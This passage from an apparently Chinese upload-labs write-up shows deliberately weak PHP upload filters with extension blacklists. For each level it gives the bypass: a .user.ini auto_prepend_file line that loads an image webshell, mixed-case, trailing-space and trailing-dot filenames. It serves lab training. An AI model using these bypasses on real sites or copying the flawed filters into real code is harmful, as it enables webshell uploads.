class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传一个.user.ini文件，文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=1.gif</span><br></pre></td></tr></table></figure><p>其含义是让所有php包含指定文件在自身执行前，还有一种是包含在执行后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=1.gif</span><br></pre></td></tr></table></figure><p>.user.ini文件上传后，通常等待300秒后即可生效，此时访问上传文件夹中的任意php文件，该php文件都会包含1.gif，以此解析图片马即可。</p><h4 id="Pass-06-黑名单，大小写绕过"><a href="#Pass-06-黑名单，大小写绕过" class="headerlink" title="Pass-06 黑名单，大小写绕过"></a>Pass-06 黑名单，大小写绕过</h4><h5 id="解题1-5"><a href="#解题1-5" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源代码中去掉了大小写转换代码，黑名单中对于php的过滤，就可以使用pHp等方式绕过了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传一个名为1.phP的木马文件</span><br></pre></td></tr></table></figure><h4 id="Pass-07-黑名单，空格绕过"><a href="#Pass-07-黑名单，空格绕过" class="headerlink" title="Pass-07 黑名单，空格绕过"></a>Pass-07 黑名单，空格绕过</h4><h5 id="解题1-6"><a href="#解题1-6" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">//少了trim()</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该题少了trim()来去掉文件名前后空格，可以利用在文件末加空格来绕过黑名单，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php[空格]</span><br></pre></td></tr></table></figure><h4 id="Pass-08-黑名单，点号绕过"><a href="#Pass-08-黑名单，点号绕过" class="headerlink" title="Pass-08 黑名单，点号绕过"></a>Pass-08 黑名单，点号绕过</h4><p><strong>注：linux不会自动删除末尾点，因此1.php.与1.php是不一样的，不适用此方法</strong></p><h5 id="解题1-7"><a href="#解题1-7" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源代码中少了$file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点，可以使用windows会自动删除扩展名最后多余点的特性，绕过黑名单。</p><p>上传：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php.</span><br></pre></td></tr></table></figure><h4 id="Pass-09-黑名单，-DATA绕过"><a href="#Pass-09-黑名单，-DATA绕过" class="headerlink" title="Pass-09 黑名单，::$DATA绕过"></a>Pass-09 黑名单，::$DATA绕过</h4><p><strong>注：Linux无此特性</strong></p><h5 id="解题1-8"><a href="#解题1-8" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span 